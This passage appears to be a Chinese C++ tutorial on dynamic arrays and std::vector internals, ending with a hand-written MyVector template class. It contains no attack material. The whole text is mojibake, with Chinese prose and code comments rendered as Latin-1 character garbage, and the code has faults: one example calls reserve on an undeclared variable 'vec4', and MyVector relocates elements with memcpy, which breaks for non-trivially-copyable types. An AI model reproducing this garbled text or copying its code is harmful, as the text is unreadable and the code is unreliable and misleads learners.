<p><strong>å†…å­˜ä½ç½®å›ºå®š</strong>åˆ™ä¼šå¯¼è‡´å­˜å‚¨åœ¨æ ˆä¸Šçš„é™æ€æ•°ç»„å®¹æ˜“è§¦å‘æ ˆæº¢å‡º,å› ä¸ºæ ˆçš„æ€»å¤§å°æ˜¯å›ºå®šçš„è€Œä¸”ç©ºé—´æ¯”è¾ƒå°;å­˜å‚¨åœ¨å…¨å±€ / é™æ€åŒºçš„æ•°ç»„åˆ™ç”Ÿå‘½å‘¨æœŸè´¯ç©¿æ•´ä¸ªç¨‹åºï¼Œæ— æ³•çµæ´»é‡Šæ”¾ã€‚</p>
<blockquote>
<p><em>å¦‚æœå¯¹C++å†…å­˜åˆ†åŒºä¸äº†è§£çš„å¯ä»¥æŸ¥çœ‹ã€Šæ¯æ—¥ä¸€ä¸ªC++çŸ¥è¯†ç‚¹|åº•å±‚å†…å­˜ç®¡ç†ã€‹,é‡Œé¢æœ‰è¯¦ç»†ä»‹ç»</em></p>
</blockquote>
<p>é‚£ä¹ˆé’ˆå¯¹é™æ€æ•°ç»„çš„å±€é™æ€§,ä¸‹é¢çš„åŠ¨æ€æ•°ç»„æä¾›äº†è§£å†³çš„åŠæ³•~</p>
<h2 data-id="heading-5">åŠ¨æ€æ•°ç»„</h2>
<p>åŠ¨æ€æ•°ç»„æ˜¯<strong>åœ¨è¿è¡Œæ—¶ç¡®å®šå¤§å°å¹¶ä¸”å¯æ‰‹åŠ¨åˆ†é…å’Œé‡Šæ”¾å†…å­˜çš„æ•°æ®ç»“æ„</strong></p>
<h3 data-id="heading-6">åº•å±‚å®ç°åŸç†</h3>
<p>C++çš„åŠ¨æ€æ•°ç»„ä¾èµ–<code>newå’Œdelete</code>æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜</p>
<p><strong>è¿è¡Œæ—¶</strong>æ ¹æ®å®é™…éœ€æ±‚è®¡ç®—æ‰€éœ€å†…å­˜å¤§å°,å¹¶ä¸”æ˜¯å­˜å‚¨åœ¨<strong>å †åŒº</strong>(å †åŒºç©ºé—´å¤§,ä¸ä¼šåƒé™æ€æ•°ç»„é‚£æ ·å­˜å‚¨åœ¨æ ˆä¸Šå®¹æ˜“è§¦å‘æ ˆæº¢å‡ºé—®é¢˜),å‘å †åŒºç”³è¯·è¿ç»­å†…å­˜,è¿”å›é¦–åœ°å€;ä½¿ç”¨å®Œæ¯•å<strong>æ‰‹åŠ¨é‡Šæ”¾</strong>å†…å­˜,é¿å…<strong>å†…å­˜æ³„æ¼</strong></p>
<p>ä¸‹é¢ç”¨ä»£ç å®ç°åŠ¨æ€æ•°ç»„:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°</span>
    <span class="hljs-type">int</span> n;
    cout &lt;&lt; <span class="hljs-string">"è¾“å…¥æ•°ç»„å¤§å°ï¼š"</span>;
    cin &gt;&gt; n;
    
    <span class="hljs-comment">// åŠ¨æ€ç”³è¯·å †å†…å­˜ï¼Œè¿”å›é¦–åœ°å€</span>
    <span class="hljs-type">int</span>* arr = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n];
    
    <span class="hljs-comment">// èµ‹å€¼å¹¶è®¿é—®</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {
        arr[i] = i * <span class="hljs-number">2</span>; <span class="hljs-comment">// ç­‰ä»·äº*(arr + i) = i * 2</span>
    }
    
    <span class="hljs-comment">// è¾“å‡ºéªŒè¯</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {
        cout &lt;&lt; arr[i] &lt;&lt; <span class="hljs-string">" "</span>;
    }
    
    <span class="hljs-comment">// æ‰‹åŠ¨é‡Šæ”¾å †å†…å­˜ï¼ˆå¿…é¡»ï¼ï¼‰</span>
    <span class="hljs-keyword">delete</span>[] arr;
    arr = <span class="hljs-literal">nullptr</span>; <span class="hljs-comment">// é¿å…é‡æŒ‡é’ˆ</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>è¿è¡Œç»“æœå¦‚ä¸‹:
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1804dc339e74c7abf837b675d53340e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=QfH%2BT9Z3%2Bl3rElnDtb52%2FWxacOQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">åŠ¨æ€æ•°ç»„çš„å±€é™æ€§</h3>
<p>è™½ç„¶åŠ¨æ€æ•°ç»„è§£å†³äº† â€œå¤§å°å›ºå®šâ€ çš„é—®é¢˜,ä½†ä»æœ‰å¦‚ä¸‹çš„å±€é™æ€§:</p>
<ol>
<li>æ‰©å®¹éº»çƒ¦:è‹¥æ•°æ®é‡è¶…è¿‡å½“å‰æ•°ç»„å¤§å°ï¼Œéœ€è¦æ‰‹åŠ¨ç”³è¯·æ›´å¤§çš„å†…å­˜å—ï¼Œæ‹·è´åŸæœ‰æ•°æ®ï¼Œé‡Šæ”¾æ—§å†…å­˜</li>
<li>éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼Œå®¹æ˜“å‡ºç°å†…å­˜æ³„æ¼</li>
<li>åŠŸèƒ½å•ä¸€:ä»…æ”¯æŒåŸºç¡€çš„è®¿é—®å’Œä¿®æ”¹,æ— å†…ç½®çš„å¢åˆ ã€åˆ¤ç©ºã€æ±‚å¤§å°ç­‰åŠŸèƒ½</li>
</ol>
<p>é’ˆå¯¹åŸç”Ÿçš„åŠ¨æ€æ•°ç»„çš„å±€é™æ€§,é‚£ä¹ˆC++çš„æ ‡å‡†æ¨¡æ¿åº“STLä¸­çš„vectoræ­£æ˜¯ä¸ºè§£å†³è¿™äº›é—®é¢˜è€Œç”Ÿçš„åŠ å¼ºç‰ˆæœ¬çš„åŠ¨æ€æ•°ç»„</p>
<h2 data-id="heading-8">vector</h2>
<p>vectoræ˜¯ C++ æ ‡å‡†åº“æä¾›çš„åŠ¨æ€æ•°ç»„å®¹å™¨,å¹¶å°è£…äº†è‡ªåŠ¨æ‰©å®¹ã€å†…å­˜ç®¡ç†ã€ä¾¿æ·æ“ä½œç­‰åŠŸèƒ½,å…¶åº•å±‚ä»ç„¶æ˜¯åŸºäºè¿ç»­çš„å †å†…å­˜å®ç°çš„</p>
<h3 data-id="heading-9">vector çš„æ ¸å¿ƒç”¨æ³•</h3>
<p>åœ¨äº†è§£vectorå®¹å™¨çš„åº•å±‚åŸç†ä¹‹å‰,æˆ‘ä»¬å…ˆç®€å•è¿‡ä¸€éå…¶åŸºæœ¬åŠŸèƒ½:</p>
<p>ä½¿ç”¨<code>vector</code>å‰éœ€åŒ…å«å¤´æ–‡ä»¶<code>#include &lt;vector&gt;</code></p>
<p>å…¶æ ¸å¿ƒç”¨æ³•åŒ…æ‹¬æ·»åŠ å…ƒç´ <code>push_back()</code>,åˆ é™¤å…ƒç´ <code>pop_back()</code>,é‡æ–°è®¾ç½®å¤§å°<code>resize(n)</code>,æ¸…ç©ºå…ƒç´ <code>vec.clear()</code>,ä¸‹é¢ç”¨ä¸€æ®µä»£ç å±•ç¤º vector çš„åŸºæœ¬ç”¨æ³•</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span>   <span class="hljs-comment">// ä½¿ç”¨vectorå¿…é¡»åŒ…å«çš„å¤´æ–‡ä»¶</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    vector&lt;<span class="hljs-type">int</span>&gt; vec = {<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>};  <span class="hljs-comment">// åˆå§‹åŒ–</span>
    
    vec.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">40</span>);  <span class="hljs-comment">// å‘å°¾éƒ¨æ·»åŠ å…ƒç´ 40 â†’ vec: [10, 20, 30, 40]</span>
    vec.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">50</span>);  <span class="hljs-comment">// ç»§ç»­æ·»åŠ å…ƒç´ 50 â†’ vec: [10, 20, 30, 40, 50]</span>
    vec.<span class="hljs-built_in">pop_back</span>();     <span class="hljs-comment">// åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ 50 â†’ vec: [10, 20, 30, 40]</span>

    <span class="hljs-type">int</span> val1 = vec[<span class="hljs-number">1</span>];  <span class="hljs-comment">// è®¿é—®ä¸‹æ ‡1çš„å…ƒç´ ï¼Œå€¼ä¸º20</span>
    vec[<span class="hljs-number">1</span>] = <span class="hljs-number">200</span>;       <span class="hljs-comment">// ä¿®æ”¹ä¸‹æ ‡1çš„å…ƒç´ ä¸º200 â†’ vec: [10, 200, 30, 40]</span>

    <span class="hljs-type">int</span> val2 = vec.<span class="hljs-built_in">at</span>(<span class="hljs-number">2</span>); <span class="hljs-comment">// è®¿é—®ä¸‹æ ‡2çš„å…ƒç´ ï¼Œå€¼ä¸º30</span>
    vec.<span class="hljs-built_in">at</span>(<span class="hljs-number">2</span>) = <span class="hljs-number">300</span>;      <span class="hljs-comment">// ä¿®æ”¹ä¸‹æ ‡2çš„å…ƒç´ ä¸º300 â†’ vec: [10, 200, 300, 40]   </span>
    
    vec4.<span class="hljs-built_in">reserve</span>(<span class="hljs-number">20</span>); <span class="hljs-comment">// é¢„ç•™å®¹é‡</span>
    vec.<span class="hljs-built_in">clear</span>(); <span class="hljs-comment">// æ¸…ç©ºæ‰€æœ‰å…ƒç´ ï¼Œå®¹é‡ä¸å˜</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-10">vector çš„åº•å±‚åŸç†</h3>
<p>ç®€å•å›é¡¾ä¸‹vectorçš„æ ¸å¿ƒç”¨æ³•ä¹‹å,æ¥ä¸‹æ¥æˆ‘ä»¬æ·±å…¥äº†è§£ vector çš„åº•å±‚åŸç†:ä¸»è¦åˆ†ä¸º<code>ä¸‰ä¸ªå…³é”®æŒ‡é’ˆ</code>,<code>è‡ªåŠ¨æ‰©å®¹æœºåˆ¶</code>å’Œ<code>æ ¸å¿ƒæ“ä½œçš„åº•å±‚é€»è¾‘</code>è¿™ä¸‰ä¸ªæ–¹é¢</p>
<h3 data-id="heading-11">ä¸‰ä¸ªå…³é”®æŒ‡é’ˆ</h3>
<p>é¦–å…ˆæ˜¯ vector çš„æ ¸å¿ƒæˆå‘˜å˜é‡é€šå¸¸åŒ…å«<strong>ä¸‰ä¸ªå…³é”®æŒ‡é’ˆ</strong>:<code>_start</code>,<code>_finish</code>,<code>_end_of_storage</code></p>
<ol>
<li><code>_start</code>ï¼šæŒ‡å‘æ•°ç»„é¦–å…ƒç´ çš„æŒ‡é’ˆ</li>
<li><code>_finish</code>ï¼šæŒ‡å‘æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªä½ç½®çš„æŒ‡é’ˆ</li>
<li><code>_end_of_storage</code>ï¼šæŒ‡å‘æ•°ç»„å†…å­˜ç©ºé—´æœ«å°¾çš„ä¸‹ä¸€ä¸ªä½ç½®çš„æŒ‡é’ˆ
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd9c2c8f53c94da8a8be783922556088~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=OJm815A7spGo6vy0RMmQxv7enqU%3D" alt="" loading="lazy"/></li>
</ol>
<p>é€šè¿‡è¿™ä¸‰ä¸ªæŒ‡é’ˆï¼Œå¯å¿«é€Ÿè®¡ç®—<code>å…ƒç´ ä¸ªæ•°</code>ã€<code>å®¹é‡å¤§å°</code>ã€<code>æ˜¯å¦ä¸ºç©º</code></p>
<blockquote>
<p>å…ƒç´ ä¸ªæ•°:<code>_finish - _start</code><br/>
å®¹é‡å¤§å°:<code>_end_of_storage - _start</code><br/>
æ˜¯å¦ä¸ºç©º:<code>if(_start == _finish)</code></p>
</blockquote>
<h3 data-id="heading-12">è‡ªåŠ¨æ‰©å®¹æœºåˆ¶</h3>
<p>ç„¶åæ˜¯ vector çš„<strong>è‡ªåŠ¨æ‰©å®¹æœºåˆ¶</strong>:å½“å‘vectorä¸­æ·»åŠ å…ƒç´ ,å¹¶ä¸”å…ƒç´ ä¸ªæ•°ç­‰äºå®¹é‡å¤§å°æ—¶,å°±ä¼šè§¦å‘æ‰©å®¹,å…¶æ‰©å®¹çš„æ ¸å¿ƒæ­¥éª¤æ˜¯å¦‚ä¸‹:
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4c612ea70f74827a66aa2f59d5b6396~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=W6SlZHhWI9AA5ieWYnDyFOcH1KY%3D" alt="" loading="lazy"/></p>
<ol>
<li><code>ç”³è¯·æ–°å†…å­˜</code>é€šå¸¸æ‰©å®¹ä¸ºåŸå®¹é‡çš„ 2 å€</li>
<li><code>æ‹·è´æ•°æ®</code>å°†åŸæ•°ç»„çš„æ‰€æœ‰å…ƒç´ æ‹·è´åˆ°æ–°å†…å­˜</li>
<li><code>é‡Šæ”¾æ—§å†…å­˜</code>,é”€æ¯åŸæ•°ç»„å…ƒç´ ,é‡Šæ”¾æ—§å†…å­˜ï¼›</li>
<li><code>æ›´æ–°æŒ‡é’ˆ</code>æ˜¯å°†_startã€_finishã€_end_of_storageæŒ‡å‘æ–°å†…å­˜çš„å¯¹åº”ä½ç½®</li>
</ol>
<p>ç¤ºæ„å›¾å¦‚ä¸‹æ‰€ç¤º:
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71cf852fc3cf4d94a561e367d3d16bf9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=K%2B0CEeFJqx%2Fo0dtRF8ncEM9SUc4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">æ ¸å¿ƒæ“ä½œçš„åº•å±‚é€»è¾‘</h3>
<p>äº†è§£å®Œvector çš„<strong>è‡ªåŠ¨æ‰©å®¹æœºåˆ¶</strong>å,ç»“åˆè‡ªåŠ¨æ‰©å®¹æœºåˆ¶,æˆ‘ä»¬è¿›ä¸€æ­¥<strong>æ ¸å¿ƒæ“ä½œçš„åº•å±‚é€»è¾‘</strong></p>
<p><code>push_back()</code>è‹¥å®¹é‡è¶³å¤Ÿï¼Œç›´æ¥åœ¨_finishä½ç½®æ„é€ å…ƒç´ ,<code>_finish++</code>;è‹¥å®¹é‡ä¸è¶³ï¼Œå…ˆæ‰©å®¹å†æ·»åŠ </p>
<p><code>pop_back()</code>é”€æ¯_finish - 1ä½ç½®çš„å…ƒç´ ,<code>_finish--</code></p>
<p><code>resize(n)</code>è‹¥n &lt; å…ƒç´ ä¸ªæ•°ï¼Œé”€æ¯å¤šä½™å…ƒç´ ;è‹¥n &gt; å…ƒç´ ä¸ªæ•°ä¸”n &lt;= å®¹é‡å¤§å°,åˆ™æ„é€ æ–°å…ƒç´ ;è‹¥n &gt; å®¹é‡å¤§å°ï¼Œ<strong>æ‰©å®¹</strong>åæ„é€ æ–°å…ƒç´ </p>
<p><code>reserve(n)</code>ä»…æ‰©å®¹å®¹é‡åˆ°n</p>
<p><code>clear()</code>ä»…é”€æ¯æ‰€æœ‰å…ƒç´ ,ä¸é‡Šæ”¾å†…å­˜ï¼Œå®¹é‡ä¿æŒä¸å˜</p>
<h2 data-id="heading-14">æ‰‹åŠ¨å®ç°vector</h2>
<p>ç†è§£äº†vectorçš„ç”¨æ³•å’Œåº•å±‚åŸç†å,ä¸ºäº†è¿›ä¸€æ­¥æ·±å…¥äº†è§£åŠ¨æ€æ•°ç»„,æˆ‘ä»¬æ‰‹åŠ¨å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆçš„vector,è¦†ç›–<code>æ„é€ </code>ã€<code>ææ„</code>ã€<code>æ·»åŠ </code>ã€<code>åˆ é™¤</code>ã€<code>å®¹é‡å¤§å°</code>ã€<code>è®¿é—®</code>ç­‰åŠŸèƒ½</p>
<p>éœ€è¦ç»“åˆæ¨¡æ¿çš„çŸ¥è¯†,å¦‚æœè¿˜æ²¡æœ‰äº†è§£è¿‡æ¨¡æ¿çš„çŸ¥è¯†çš„æœ‹å‹å¯ä»¥å…ˆçœ‹ä¸€éã€Šæ¯æ—¥ä¸€ä¸ªC++çŸ¥è¯†ç‚¹|æ¨¡æ¿ã€‹è¿™ç¯‡æ–‡ç« ,æœ‰ä¸€ä¸ªåˆæ­¥çš„å°è±¡</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span> <span class="hljs-comment">// ç”¨äºmemcpy</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyVector</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–ç©ºæ•°ç»„</span>
    <span class="hljs-built_in">MyVector</span>() : _start(<span class="hljs-literal">nullptr</span>), _finish(<span class="hljs-literal">nullptr</span>), _end_of_storage(<span class="hljs-literal">nullptr</span>) {}

    <span class="hljs-comment">// ææ„å‡½æ•°ï¼šé‡Šæ”¾å†…å­˜</span>
    ~<span class="hljs-built_in">MyVector</span>() {
        <span class="hljs-comment">// é”€æ¯æ‰€æœ‰å…ƒç´ </span>
        <span class="hljs-keyword">while</span> (_finish &gt; _start) {
            --_finish;
            _finish-&gt;~<span class="hljs-built_in">T</span>(); <span class="hljs-comment">// è°ƒç”¨å…ƒç´ çš„ææ„å‡½æ•°</span>
        }
        <span class="hljs-comment">// é‡Šæ”¾å †å†…å­˜</span>
        <span class="hljs-keyword">if</span> (_start) {
            ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(_start)</span></span>;
        }
    }

    <span class="hljs-comment">// ç¦ç”¨æ‹·è´æ„é€ å’Œèµ‹å€¼ï¼ˆç®€åŒ–ç‰ˆï¼Œé¿å…æµ…æ‹·è´é—®é¢˜ï¼‰</span>
    <span class="hljs-built_in">MyVector</span>(<span class="hljs-type">const</span> MyVector&amp;) = <span class="hljs-keyword">delete</span>;
    MyVector&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> MyVector&amp;) = <span class="hljs-keyword">delete</span>;

    <span class="hljs-comment">// å‘å°¾éƒ¨æ·»åŠ å…ƒç´ </span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(<span class="hljs-type">const</span> T&amp; value)</span> </span>{
        <span class="hljs-comment">// æ£€æŸ¥å®¹é‡ï¼Œä¸è¶³åˆ™æ‰©å®¹</span>
        <span class="hljs-keyword">if</span> (_finish == _end_of_storage) {
            <span class="hljs-type">size_t</span> new_capacity = <span class="hljs-built_in">capacity</span>() == <span class="hljs-number">0</span> ? <span class="hljs-number">4</span> : <span class="hljs-built_in">capacity</span>() * <span class="hljs-number">2</span>;
            <span class="hljs-built_in">reserve</span>(new_capacity);
        }
        <span class="hljs-comment">// åœ¨_finishä½ç½®æ„é€ å…ƒç´ </span>
        <span class="hljs-keyword">new</span> (_finish) <span class="hljs-built_in">T</span>(value); <span class="hljs-comment">// å®šä½newï¼Œä¸ç”³è¯·å†…å­˜ä»…æ„é€ å¯¹è±¡</span>
        ++_finish;
    }

    <span class="hljs-comment">// ä»å°¾éƒ¨åˆ é™¤å…ƒç´ </span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop_back</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">empty</span>()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">"MyVector is empty!"</span>);
        }
        --_finish;
        _finish-&gt;~<span class="hljs-built_in">T</span>(); <span class="hljs-comment">// é”€æ¯æœ€åä¸€ä¸ªå…ƒç´ </span>
    }

    <span class="hljs-comment">// é‡è½½[]è¿ç®—ç¬¦ï¼Œæ”¯æŒéšæœºè®¿é—®</span>
    T&amp; <span class="hljs-keyword">operator</span>[](<span class="hljs-type">size_t</span> index) {
        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">size</span>()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">"Index out of range!"</span>);
        }
        <span class="hljs-keyword">return</span> *(_start + index);
    }

    <span class="hljs-comment">// constç‰ˆæœ¬çš„[]è®¿é—®</span>
    <span class="hljs-type">const</span> T&amp; <span class="hljs-keyword">operator</span>[](<span class="hljs-type">size_t</span> index) <span class="hljs-type">const</span> {
        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">size</span>()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">"Index out of range!"</span>);
        }
        <span class="hljs-keyword">return</span> *(_start + index);
    }

    <span class="hljs-comment">// è·å–å…ƒç´ ä¸ªæ•°</span>
    <span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{
        <span class="hljs-keyword">return</span> _finish - _start;
    }

    <span class="hljs-comment">// è·å–å®¹é‡</span>
    <span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">capacity</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{
        <span class="hljs-keyword">return</span> _end_of_storage - _start;
    }

    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ä¸ºç©º</span>
    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{
        <span class="hljs-keyword">return</span> _start == _finish;
    }

    <span class="hljs-comment">// é¢„ç•™å®¹é‡ï¼ˆæ‰©å®¹ï¼‰</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reserve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> new_capacity)</span> </span>{
        <span class="hljs-keyword">if</span> (new_capacity &lt;= <span class="hljs-built_in">capacity</span>()) {
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 1. ç”³è¯·æ–°å†…å­˜</span>
        T* new_start = (T*)::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(new_capacity * <span class="hljs-built_in">sizeof</span>(T));
        <span class="hljs-comment">// 2. æ‹·è´åŸæœ‰å…ƒç´ åˆ°æ–°å†…å­˜</span>
        <span class="hljs-type">size_t</span> old_size = <span class="hljs-built_in">size</span>();
        <span class="hljs-keyword">if</span> (_start) {
            <span class="hljs-comment">// å†…å­˜æ‹·è´ï¼ˆæµ…æ‹·è´ï¼Œç®€åŒ–ç‰ˆï¼‰</span>
            <span class="hljs-built_in">memcpy</span>(new_start, _start, old_size * <span class="hljs-built_in">sizeof</span>(T));
            <span class="hljs-comment">// é‡Šæ”¾æ—§å†…å­˜</span>
            ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(_start)</span></span>;
        }
        <span class="hljs-comment">// 3. æ›´æ–°æŒ‡é’ˆ</span>
        _start = new_start;
        _finish = _start + old_size;
        _end_of_storage = _start + new_capacity;
    }

<span class="hljs-keyword">private</span>:
    T* _start;          <span class="hljs-comment">// æŒ‡å‘æ•°ç»„é¦–å…ƒç´ </span>
    T* _finish;         <span class="hljs-comment">// æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªä½ç½®</span>
    T* _end_of_storage; <span class="hljs-comment">// æŒ‡å‘å†…å­˜æœ«å°¾çš„ä¸‹ä¸€ä¸ªä½ç½®</span>
};

<span class="hljs-comment">// æµ‹è¯•ä»£ç </span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    MyVector&lt;<span class="hljs-type">int</span>&gt; vec;
    
    <span class="hljs-comment">// æµ‹è¯•push_backå’Œsize/capacity</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        vec.<span class="hljs-built_in">push_back</span>(i);
        cout &lt;&lt; <span class="hljs-string">"æ·»åŠ å…ƒç´ "</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">"ï¼šsize="</span> &lt;&lt; vec.<span class="hljs-built_in">size</span>() 
             &lt;&lt; <span class="hljs-string">"ï¼Œcapacity="</span> &lt;&lt; vec.<span class="hljs-built_in">capacity</span>() &lt;&lt; endl;
    }

    <span class="hljs-comment">// æµ‹è¯•[]è®¿é—®</span>
    cout &lt;&lt; <span class="hljs-string">"\næ•°ç»„å…ƒç´ ï¼š"</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; vec.<span class="hljs-built_in">size</span>(); i++) {
        cout &lt;&lt; vec[i] &lt;&lt; <span class="hljs-string">" "</span>;
    }
    cout &lt;&lt; endl;

    <span class="hljs-comment">// æµ‹è¯•pop_back</span>
    vec.<span class="hljs-built_in">pop_back</span>();
    vec.<span class="hljs-built_in">pop_back</span>();
    cout &lt;&lt; <span class="hljs-string">"\nåˆ é™¤2ä¸ªå…ƒç´ åï¼Œsize="</span> &lt;&lt; vec.<span class="hljs-built_in">size</span>() 
         &lt;&lt; <span class="hljs-string">"ï¼Œcapacity="</span> &lt;&lt; vec.<span class="hljs-built_in">capacity</span>() &lt;&lt; endl;
    cout &lt;&lt; <span class="hljs-string">"æœ€åä¸€ä¸ªå…ƒç´ ï¼š"</span> &lt;&lt; vec[vec.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>] &lt;&lt; endl;

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>è¿è¡Œç»“æœå¦‚ä¸‹:
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/005a8417cf9744b6886cdce9bf8eda58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=qLu0dj2OmVcTcC7cGPgL7RYESDs%3D" alt="" loading="lazy"/>
ä»¥ä¸Šå°±æ˜¯å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆçš„vector</p>
<h2 data-id="heading-15">æ€»ç»“</h2>
<p>æœ¬æ–‡é€šè¿‡å¼•å…¥æ•°æ®ç»“æ„çš„æ¦‚å¿µ,è¿›è€Œä»‹ç»æœ€åŸºæœ¬çš„æ•°æ®ç»“æ„--<code>æ•°ç»„</code>,ç„¶ååˆ†åˆ«ä»‹ç»æ•°ç»„çš„ä¸¤ç§å½¢å¼--<code>é™æ€æ•°ç»„</code>å’Œ<code>åŠ¨æ€æ•°ç»„</code>,åœ¨åŠ¨æ€æ•°ç»„ä¸­é‡ç‚¹ä»‹ç»STLçš„<code>vectorå®¹å™¨</code>,å¹¶æ‰‹åŠ¨å®ç°ä¸€ä¸ªvectorå®¹å™¨,ç”±æµ…å…¥æ·±,å±‚å±‚é€’è¿›</p>
